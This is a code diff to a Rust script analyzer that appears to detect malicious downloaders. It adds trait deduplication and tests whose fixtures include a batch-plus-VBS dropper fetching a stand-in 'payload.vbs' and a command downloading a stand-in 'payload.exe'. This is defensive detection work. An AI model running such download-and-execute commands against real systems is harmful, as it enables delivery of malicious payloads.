@@ -9154,6 +9154,33 @@ fn semantic_dedup_key(t: &Trait) -> Option<String> {
 
 fn dedup_traits(traits: &mut Vec<Trait>, max_per_kind: u32) {
     use std::collections::HashMap;
+    let structured_download_urls: std::collections::HashSet<String> = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download { src, .. } => Some(src.clone()),
+            Trait::CertutilDownload { url, .. } | Trait::BitsadminDownload { url, .. } => {
+                Some(url.clone())
+            }
+            _ => None,
+        })
+        .collect();
+    let structured_download_cmd_urls: std::collections::HashSet<(String, String)> = traits
+        .iter()
+        .filter_map(|t| match t {
+            Trait::Download { cmd, src, .. } => Some((cmd.clone(), src.clone())),
+            _ => None,
+        })
+        .collect();
+    traits.retain(|t| {
+        !matches!(
+            t,
+            Trait::DownloadInDeobText { src, .. } if structured_download_urls.contains(src)
+        ) && !matches!(
+            t,
+            Trait::UrlArgument { cmd, url }
+                if structured_download_cmd_urls.contains(&(cmd.clone(), url.clone()))
+        )
+    });
     let launch_urls: std::collections::HashSet<String> = traits
         .iter()
         .filter_map(|t| match t {
@@ -25639,6 +25666,63 @@ mod deob_url_scan_tests {
         assert_eq!(
             sweep_count, 0,
             "mshta URL double-emitted as DownloadInDeobText: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn generic_download_is_removed_when_structured_download_exists() {
+        let url = "https://dedupe-child-vbs.example/payload.vbs";
+        let script = format!(
+            r#"@echo off
+>"child.vbs" (
+echo Dim u, x
+echo u = "{url}"
+echo Set x = CreateObject("MSXML2.XMLHTTP")
+echo x.open "GET", u, False
+echo x.send
+)
+wscript //nologo "child.vbs"
+"#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == url)),
+            "structured child VBS download missing: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
+            "structured URL double-emitted as generic: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn generic_url_argument_is_removed_when_structured_download_exists() {
+        let url = "https://dedupe-urlarg.example/payload.exe";
+        let script = format!(r#""C:\Tools\rdl.exe" -LJOk {url}"#);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Download { src, .. } if src == url)),
+            "structured process download missing: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::UrlArgument { url: got, .. } if got == url)),
+            "structured process download double-emitted as UrlArgument: {:?}",
             report.traits
         );
     }
